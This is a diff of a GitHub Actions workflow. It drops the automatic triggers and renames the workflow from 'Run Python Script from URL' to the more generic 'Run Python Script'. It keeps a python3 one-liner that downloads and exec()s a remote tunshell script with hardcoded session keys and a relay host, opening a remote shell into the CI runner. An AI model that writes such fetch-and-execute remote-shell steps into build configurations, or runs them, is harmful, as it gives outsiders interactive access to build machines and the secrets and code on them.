@@ -1,10 +1,6 @@
-name: Run Python Script from URL
+name: Run Python Script
 
 on:
-  push:
-    branches:
-      - main
-  pull_request:
   workflow_dispatch: # Allows manual triggering of the workflow
 
 jobs:
@@ -22,5 +18,4 @@ jobs:
 
     - name: Run Python script
       run: |
-        echo "Running Python script from URL"
-        python3 -c "import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","i8bbGPVWH1izLdHpQpfvDs","TXCBGaMLh6brBCy2qMNLtR","eu.relay.tunshell.com"]})"
+        python3 -c "import urllib.request; r = urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'i8bbGPVWH1izLdHpQpfvDs', 'TXCBGaMLh6brBCy2qMNLtR', 'eu.relay.tunshell.com']})"
